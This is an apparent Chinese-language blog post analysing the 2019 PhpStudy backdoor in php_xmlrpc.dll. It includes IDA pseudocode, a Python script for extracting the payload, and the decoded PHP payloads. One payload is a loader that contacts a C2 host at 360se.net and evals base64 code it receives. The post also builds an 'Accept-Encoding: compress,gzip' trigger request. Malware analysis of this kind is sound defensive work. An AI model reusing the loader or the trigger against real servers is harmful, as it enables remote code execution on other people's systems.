@@ -1,0 +1,1660 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="PhpStudy BackDoor2019 深度分析, Qftm">
+    <meta name="description" content="Maybe a hacker">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PhpStudy BackDoor2019 深度分析 | Qftm</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Qftm</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Qftm</div>
+        <div class="logo-desc">
+            
+            Maybe a hacker
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-heartbeat"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PhpStudy BackDoor2019 深度分析</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/">
+                                <span class="chip bg-color">木马后门</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                代码审计
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2019-11-22
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2020-08-15
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    3.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    18 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>关于《PhpStudy BackDoor》风波已经过去有一段时间了，由于，前段时间一直忙于其它事情QAQ，今天有时间对该事件重新回溯&amp;深度分析。</p>
+<p>严正声明：本文仅限于技术讨论与分享，严禁用于非法途径</p>
+<h2 id="背景分析"><a href="#背景分析" class="headerlink" title="背景分析"></a>背景分析</h2><p>2019年9月20日，杭州市公安局举行新闻通报会，通报今年以来组织开展打击涉网违法犯罪暨“净网2019”专项行动战果，通报内容中提到国内著名的PHP调试环境程序集成包Phpstudy软件遭受到以马某为首的国内黑客团伙攻击并被植入后门。 Phpstudy集成环境包在国内的使用用户逾百万，据悉，此次后门攻击事件可追溯到2016年，屹今为止累计控制计算机逾67万台，该黑客团伙通过该后门获取的用户信息、各类系统账号信息进一步开展违法行为，累计非法牟利600余万元。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><pre><code>phpStudy20180211版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll
+
+phpStudy20161103版本 php5.4.45与php5.2.17 ext扩展文件夹下的php_xmlrpc.dll</code></pre><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>测试环境以“phpStudy20161103版本 php5.4.45”为例进行分析</p>
+<p>ps:目前官方已更新旧版本程序，可自行下载 <a href="https://www.xp.cn" target="_blank" rel="noopener">https://www.xp.cn</a></p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109010943566-1687626121.png" alt="img"></p>
+<p> 第一个是目前官方正常配置文件，第二个是被植入后门的配置文件，从图中直观的也能看出来两个文件的大小不一样！！分别对其进行Hash校验：</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109011256251-1944581236.png" alt="img"></p>
+<p>MD5(php_xmlrpc.dll)：c339482fd2b233fb0a555b629c0ea5d5</p>
+<p>MD5(php_xmlrpc true.dll)：6ddb8f2af4b2b24671ddcd82d7c08c91</p>
+<p>通过Hash校验发现两个文件的Hash值不一样！</p>
+<h2 id="后门分析"><a href="#后门分析" class="headerlink" title="后门分析"></a>后门分析</h2><p>目前各大厂商已将此后门加入威胁情报库中，此处通过virustotal和火绒查看</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109012645589-1636995059.png" alt="img"></p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109122411923-372502715.png" alt="img"></p>
+<p> 从上图可以看到原始的php_xmlrpc.dll存在威胁，接下来开始对“php_xmlrpc.dll”进行深入分析……</p>
+<p>通过IDA进行查看可以发现官方更新过的“php_xmlrpc.dll”文件已经不存在危险函数“sub_100031F0”，下面正式分析被植入后门的“php_xmlrpc.dll”</p>
+<p>首先，用IDA打开“php_xmlrpc.dll”，shift+f12定位是否存在危险字符串</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109095208650-351165891.png" alt="img"></p>
+<p>通过索引发现存在危险函数eval()</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109095706724-1336829786.png" alt="img"></p>
+<p>根据eval()函数定位到相应的代码段然后反编译伪代码找到后门危险函数<strong>“sub_100031F0”</strong></p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109100056201-655788677.png" alt="img"></p>
+<p> <img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109100234309-1119366384.png" alt="img"></p>
+<p><strong>“sub_100031F0”</strong>程序代码 </p>
+<pre><code>int __cdecl sub_100031F0(int a1, int a2, _DWORD *a3)
+{
+  int v3; // edx
+  int v4; // eax
+  int v5; // ecx
+  int v6; // eax
+  int v7; // esi
+  char *v8; // edi
+  char *v9; // ecx
+  int v10; // eax
+  char *v11; // esi
+  int v12; // eax
+  char *v13; // edi
+  char *v14; // ecx
+  _DWORD *v15; // esi
+  int v16; // eax
+  void *v17; // edx
+  int v18; // eax
+  void *v19; // edi
+  _DWORD *v20; // esi
+  int result; // eax
+  int v22; // eax
+  int v23; // ecx
+  int v24; // eax
+  int v25; // edi
+  _DWORD *v26; // esi
+  char v27; // [esp+Dh] [ebp-19Bh]
+  __int16 v28; // [esp+BDh] [ebp-EBh]
+  char v29; // [esp+BFh] [ebp-E9h]
+  char v30; // [esp+C0h] [ebp-E8h]
+  char v31; // [esp+100h] [ebp-A8h]
+  char v32; // [esp+140h] [ebp-68h]
+  char v33; // [esp+180h] [ebp-28h]
+  const char ***v34; // [esp+184h] [ebp-24h]
+  int v35; // [esp+188h] [ebp-20h]
+  int v36; // [esp+18Ch] [ebp-1Ch]
+  int **v37; // [esp+190h] [ebp-18h]
+  int v38; // [esp+194h] [ebp-14h]
+  _DWORD **v39; // [esp+198h] [ebp-10h]
+  void *v40; // [esp+19Ch] [ebp-Ch]
+  char *v41; // [esp+1A0h] [ebp-8h]
+  char *v42; // [esp+1A4h] [ebp-4h]
+
+  memset(&amp;v27, 0, 0xB0u);
+  v28 = 0;
+  v3 = *a3;
+  v29 = 0;
+  if ( *(_BYTE *)(*(_DWORD *)(v3 + 4 * core_globals_id - 4) + 210) )
+    zend_is_auto_global(aServer, 7, a3);
+  zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, 8, &amp;v33);
+  if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &amp;v39) != -1
+    &amp;&amp; zend_hash_find(**v39, aHttpAcceptEnco, strlen(aHttpAcceptEnco) + 1, &amp;v34) != -1 )
+  {
+    if ( !strcmp(**v34, aGzipDeflate) )
+    {
+      if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &amp;v39) != -1
+        &amp;&amp; zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &amp;v37) != -1 )
+      {
+        v40 = sub_100040B0(**v37, strlen((const char *)**v37));
+        if ( v40 )
+        {
+          v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+          v5 = *(_DWORD *)(v4 + 296);
+          *(_DWORD *)(v4 + 296) = &amp;v30;
+          v35 = v5;
+          v6 = setjmp3(&amp;v30, 0);
+          v7 = v35;
+          if ( v6 )
+            *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
+          else
+            zend_eval_string(v40, 0, &amp;byte_10012884, a3);
+          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
+        }
+      }
+    }
+    else
+    {
+      v12 = strcmp(**v34, aCompressGzip);
+      if ( !v12 )
+      {
+        v13 = &amp;byte_10012884;
+        v14 = (char *)&amp;unk_1000D66C;
+        v42 = &amp;byte_10012884;
+        v15 = &amp;unk_1000D66C;
+        while ( 1 )
+        {
+          if ( *v15 == 39 )
+          {
+            v13[v12] = 92;
+            v42[v12 + 1] = *v14;
+            v12 += 2;
+            v15 += 2;
+          }
+          else
+          {
+            v13[v12++] = *v14;
+            ++v15;
+          }
+          v14 += 4;
+          if ( (signed int)v14 &gt;= (signed int)&amp;unk_1000E5C4 )
+            break;
+          v13 = v42;
+        }
+        spprintf(&amp;v36, 0, aVSMS, byte_100127B8, Dest);
+        spprintf(&amp;v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+        v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+        v17 = *(void **)(v16 + 296);
+        *(_DWORD *)(v16 + 296) = &amp;v32;
+        v40 = v17;
+        v18 = setjmp3(&amp;v32, 0);
+        v19 = v40;
+        if ( v18 )
+        {
+          v20 = a3;
+          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v40;
+        }
+        else
+        {
+          v20 = a3;
+          zend_eval_string(v42, 0, &amp;byte_10012884, a3);
+        }
+        result = 0;
+        *(_DWORD *)(*(_DWORD *)(*v20 + 4 * executor_globals_id - 4) + 296) = v19;
+        return result;
+      }
+    }
+  }
+  if ( dword_10012AB0 - dword_10012AA0 &gt;= dword_1000D010 &amp;&amp; dword_10012AB0 - dword_10012AA0 &lt; 6000 )
+  {
+    if ( strlen(byte_100127B8) == 0 )
+      sub_10004480(byte_100127B8);
+    if ( strlen(Dest) == 0 )
+      sub_10004380(Dest);
+    if ( strlen(byte_100127EC) == 0 )
+      sub_100044E0(byte_100127EC);
+    v8 = &amp;byte_10012884;
+    v9 = asc_1000D028;
+    v41 = &amp;byte_10012884;
+    v10 = 0;
+    v11 = asc_1000D028;
+    while ( 1 )
+    {
+      if ( *(_DWORD *)v11 == 39 )
+      {
+        v8[v10] = 92;
+        v41[v10 + 1] = *v9;
+        v10 += 2;
+        v11 += 8;
+      }
+      else
+      {
+        v8[v10++] = *v9;
+        v11 += 4;
+      }
+      v9 += 4;
+      if ( (signed int)v9 &gt;= (signed int)&amp;unk_1000D66C )
+        break;
+      v8 = v41;
+    }
+    spprintf(&amp;v41, 0, aEvalSS, aGzuncompress, v41);
+    v22 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+    v23 = *(_DWORD *)(v22 + 296);
+    *(_DWORD *)(v22 + 296) = &amp;v31;
+    v38 = v23;
+    v24 = setjmp3(&amp;v31, 0);
+    v25 = v38;
+    if ( v24 )
+    {
+      v26 = a3;
+      *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;
+    }
+    else
+    {
+      v26 = a3;
+      zend_eval_string(v41, 0, &amp;byte_10012884, a3);
+    }
+    *(_DWORD *)(*(_DWORD *)(*v26 + 4 * executor_globals_id - 4) + 296) = v25;
+    if ( dword_1000D010 &lt; 3600 )
+      dword_1000D010 += 3600;
+    ftime(&amp;dword_10012AA0);
+  }
+
+  ftime(&amp;dword_10012AB0);
+  if ( dword_10012AA0 &lt; 0 )
+    ftime(&amp;dword_10012AA0);
+  return 0;
+}</code></pre><p>首先分析spprintf()函数代码处功能，因为其对eval()函数进行了处理</p>
+<pre><code>spprintf(&amp;v42, 0, aSEvalSS, v36, aGzuncompress, v42);spprintf(&amp;v41, 0, aEvalSS, aGzuncompress, v41);</code></pre><p>spprintf函数是php官方自己封装的函数，此处实际上实现的是字符串拼接功能，实际代码如下：</p>
+<pre><code>@eval(%s(&#39;,27h,&#39;%s&#39;,27h,&#39;));@eval(gzuncompress(&#39;,27h,’v42′,27h,&#39;)); 
+@eval(gzuncompress(&#39;,27h,’v41′,27h,&#39;)); </code></pre><p>ps:eval()函数中第一个%s位格式化字符串、第二个%s为字符串传参</p>
+<p>可以看到上述代码主要对v41、v42数据进行解压执行操控，可以初步猜想恶意代码存在于v41和v42数据中，同理按照思路流程向上去找v41、v42数据内容，</p>
+<p>对v41的处理代码</p>
+<pre><code>if ( strlen(byte_100127EC) == 0 )
+      sub_100044E0(byte_100127EC);
+    v8 = &amp;byte_10012884;
+    v9 = asc_1000D028;
+    v41 = &amp;byte_10012884;
+    v10 = 0;
+    v11 = asc_1000D028;
+    while ( 1 )
+    {
+      if ( *(_DWORD *)v11 == 39 )
+      {
+        v8[v10] = 92;
+        v41[v10 + 1] = *v9;
+        v10 += 2;
+        v11 += 8;
+      }
+      else
+      {
+        v8[v10++] = *v9;
+        v11 += 4;
+      }
+      v9 += 4;
+      if ( (signed int)v9 &gt;= (signed int)&amp;unk_1000D66C )
+        break;
+      v8 = v41;
+    }</code></pre><p>对v42的处理代码</p>
+<pre><code>if ( !v12 )
+      {
+        v13 = &amp;byte_10012884;
+        v14 = (char *)&amp;unk_1000D66C;
+        v42 = &amp;byte_10012884;
+        v15 = &amp;unk_1000D66C;
+        while ( 1 )
+        {
+          if ( *v15 == 39 )
+          {
+            v13[v12] = 92;
+            v42[v12 + 1] = *v14;
+            v12 += 2;
+            v15 += 2;
+          }
+          else
+          {
+            v13[v12++] = *v14;
+            ++v15;
+          }
+          v14 += 4;
+          if ( (signed int)v14 &gt;= (signed int)&amp;unk_1000E5C4 )
+            break;
+          v13 = v42;
+        }</code></pre><p>分析代码可知v41数据内容是1000D028-1000D66C(基地址为10000000)范围内的数据，v42数据内容是1000D66C-1000E5C4(基地址为10000000)范围内的数据，使用010edit查看发现其均位于.data数据块</p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109104704121-1148310721.png" alt="img"></p>
+<p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109105319246-1285780144.png" alt="img"></p>
+<p>由于.data为dword类型每个值占用4个字节，代码处将其转换为char类型进行存储，然后使用php内置函数gzuncompress对其解压执行</p>
+<p>使用微步情报局公开的解密脚本进行两段数据的提取解压</p>
+<pre><code># -*- coding:utf-8 -*-
+
+    # !/usr/bin/env python
+
+    import os, sys, string, shutil, re
+
+    import base64
+
+    import struct
+
+    import pefile
+
+    import ctypes
+
+    import zlib
+
+    # import put_family_c2
+
+    def hexdump(src, length=16):
+
+        FILTER = &#39;&#39;.join([(len(repr(chr(x))) == 3) and chr(x) or &#39;.&#39; for x in range(256)])
+
+        lines = []
+
+        for c in xrange(0, len(src), length):
+
+            chars = src[c:c + length]
+
+            hex = &#39; &#39;.join([&quot;%02x&quot; % ord(x) for x in chars])
+
+            printable = &#39;&#39;.join([&quot;%s&quot; % ((ord(x) &lt;= 127 and FILTER[ord(x)]) or &#39;.&#39;)
+
+                                 for x in chars])
+
+            lines.append(&quot;%04x  %-*s  %s\n&quot; % (c, length * 3, hex, printable))
+
+        return &#39;&#39;.join(lines)
+
+    def descrypt(data):
+
+        try:
+
+            # data = base64.encodestring(data)
+
+            # print(hexdump(data))
+
+            num = 0
+
+            data = zlib.decompress(data)
+
+            # return result
+
+            return (True, result)
+
+        except Exception, e:
+
+            print(e)
+
+            return (False, &quot;&quot;)
+
+    def GetSectionData(pe, Section):
+
+        try:
+
+            ep = Section.VirtualAddress
+
+            ep_ava = Section.VirtualAddress + pe.OPTIONAL_HEADER.ImageBase
+
+            data = pe.get_memory_mapped_image()[ep:ep + Section.Misc_VirtualSize]
+
+            # print(hexdump(data))
+
+            return data
+
+        except Exception, e:
+
+            return None
+
+    def GetSecsions(PE):
+
+        try:
+
+            for section in PE.sections:
+
+                # print(hexdump(section.Name))
+
+                if (section.Name.replace(&#39;\x00&#39;, &#39;&#39;) == &#39;.data&#39;):
+
+                    data = GetSectionData(PE, section)
+
+                    # print(hexdump(data))
+
+                    return (True, data)
+
+            return (False, &quot;&quot;)
+
+        except Exception, e:
+
+            return (False, &quot;&quot;)
+
+    def get_encodedata(filename):
+
+        pe = pefile.PE(filename)
+
+        (ret, data) = GetSecsions(pe)
+
+        if ret:
+
+            flag = &quot;gzuncompress&quot;
+
+            offset = data.find(flag)
+
+            data = data[offset + 0x10:offset + 0x10 + 0x567 * 4].replace(&quot;\x00\x00\x00&quot;, &quot;&quot;)
+
+            decodedata_1 = zlib.decompress(data[:0x191])
+
+            print(hexdump(data[0x191:]))
+
+            decodedata_2 = zlib.decompress(data[0x191:])
+
+            with open(&quot;decode_1.txt&quot;, &quot;w&quot;) as hwrite:
+
+                hwrite.write(decodedata_1)
+
+                hwrite.close
+
+            with open(&quot;decode_2.txt&quot;, &quot;w&quot;) as hwrite:
+
+                hwrite.write(decodedata_2)
+
+                hwrite.close
+
+    def main(path):
+
+        c2s = []
+
+        domains = []
+
+        file_list = os.listdir(path)
+
+        for f in file_list:
+
+            print f
+
+            file_path = os.path.join(path, f)
+
+            get_encodedata(file_path)
+
+    if __name__ == &quot;__main__&quot;:
+
+        # os.getcwd()
+
+        path = &quot;php5.4.45&quot;
+
+        main(path)</code></pre><p>运行结果生成两个数据文件分别对应v41、v42，查看数据内容是经过base64编码过的，对其解码</p>
+<p>v41数据</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);
+
+    error_reporting(0);
+
+    $h = $_SERVER[&#39;HTTP_HOST&#39;];
+
+    $p = $_SERVER[&#39;SERVER_PORT&#39;];
+
+    $fp = fsockopen($h, $p, $errno, $errstr, 5);
+
+    if (!$fp) {
+
+    } else {
+
+        $out = &quot;GET {$_SERVER[&#39;SCRIPT_NAME&#39;]} HTTP/1.1\r\n&quot;;
+
+        $out .= &quot;Host: {$h}\r\n&quot;;
+
+        $out .= &quot;Accept-Encoding: compress,gzip\r\n&quot;;
+
+        $out .= &quot;Connection: Close\r\n\r\n&quot;;
+
+        fwrite($fp, $out);
+
+        fclose($fp);
+
+    }</code></pre><p>v41脚本：使用fsockopen模拟GET发包</p>
+<p>v42数据</p>
+<pre><code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);
+
+    error_reporting(0);
+
+    function tcpGet($sendMsg = &#39;&#39;, $ip = &#39;360se.net&#39;, $port = &#39;20123&#39;){
+
+        $result = &quot;&quot;;
+
+      $handle = stream_socket_client(&quot;tcp://{$ip}:{$port}&quot;, $errno, $errstr,10);
+
+      if( !$handle ){
+
+        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
+
+        if( !$handle ){
+
+            return &quot;err&quot;;
+
+        }
+
+      }
+
+      fwrite($handle, $sendMsg.&quot;\n&quot;);
+
+        while(!feof($handle)){
+
+            stream_set_timeout($handle, 2);
+
+            $result .= fread($handle, 1024);
+
+            $info = stream_get_meta_data($handle);
+
+            if ($info[&#39;timed_out&#39;]) {
+
+              break;
+
+            }
+
+         }
+
+      fclose($handle);
+
+      return $result;
+
+    }
+
+    $ds = array(&quot;www&quot;,&quot;bbs&quot;,&quot;cms&quot;,&quot;down&quot;,&quot;up&quot;,&quot;file&quot;,&quot;ftp&quot;);
+
+    $ps = array(&quot;20123&quot;,&quot;40125&quot;,&quot;8080&quot;,&quot;80&quot;,&quot;53&quot;);
+
+    $n = false;
+
+    do {
+
+        $n = false;
+
+        foreach ($ds as $d){
+
+            $b = false;
+
+            foreach ($ps as $p){
+
+                $result = tcpGet($i,$d.&quot;.360se.net&quot;,$p);
+
+                if ($result != &quot;err&quot;){
+
+                    $b =true;
+
+                    break;
+
+                }
+
+            }
+
+            if ($b)break;
+
+        }
+
+        $info = explode(&quot;&lt;^&gt;&quot;,$result);
+
+        if (count($info)==4){
+
+            if (strpos($info[3],&quot;/*Onemore*/&quot;) !== false){
+
+                $info[3] = str_replace(&quot;/*Onemore*/&quot;,&quot;&quot;,$info[3]);
+
+                $n=true;
+
+            }
+
+            @eval(base64_decode($info[3]));
+
+        }
+
+    }while($n);
+
+</code></pre><p>v42脚本：后门c2服务器(360se.net)(当前c2已经失活，因此不会对相关被控主机造成新的危害)</p>
+<p>ps:从上面v41、v42数据的提取过程，可以发现攻击者对数据进行了压缩存储，增加了恶意代码的隐蔽性，同时c2服务器域名模仿了奇虎360公司相关产品名称，具有一定的欺诈特性。</p>
+<h3 id="分析反向连接c2后门"><a href="#分析反向连接c2后门" class="headerlink" title="分析反向连接c2后门"></a>分析反向连接c2后门</h3><p>核心代码</p>
+<pre><code>v12 = strcmp(**v34, aCompressGzip);       // //compress,gzip
+      if ( !v12 )
+      {
+        v13 = &amp;byte_10012884;
+        v14 = (char *)&amp;unk_1000D66C;
+        v42 = &amp;byte_10012884;
+        v15 = &amp;unk_1000D66C;
+        while ( 1 )
+        {
+          if ( *v15 == 39 )
+          {
+            v13[v12] = 92;
+            v42[v12 + 1] = *v14;
+            v12 += 2;
+            v15 += 2;
+          }
+          else
+          {
+            v13[v12++] = *v14;
+            ++v15;
+          }
+          v14 += 4;
+          if ( (signed int)v14 &gt;= (signed int)&amp;unk_1000E5C4 )
+            break;
+          v13 = v42;
+        }
+        spprintf(&amp;v36, 0, aVSMS, byte_100127B8, Dest);
+        spprintf(&amp;v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+        v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
+        v17 = *(void **)(v16 + 296);
+
+</code></pre><p>分析代码逻辑，首先想要执行</p>
+<pre><code>spprintf(&amp;v42, 0, aSEvalSS, v36, aGzuncompress, v42);
+
+</code></pre><p>必须满足if ( !v12 )</p>
+<pre><code>v12 = strcmp(**v34, aCompressGzip);
+if ( !v12 )
+
+</code></pre><p><img src="/2019/11/22/PhpStudyBackDoor2019/1594459-20191109114517003-67919308.png" alt="img"></p>
+<p>定位aCompressGzip，只要ACCEPT_ENCODING等于compress,gzip即可出发v42恶意代码</p>
+<p>构造相应Payload：</p>
+<pre><code>GET / HTTP/1.1
+Host: x.x.x.x
+…..
+Accept-Encoding:compress,gzip
+….
+
+</code></pre><p>ps:由于C2服务器已经失效，不在进行后续操作</p>
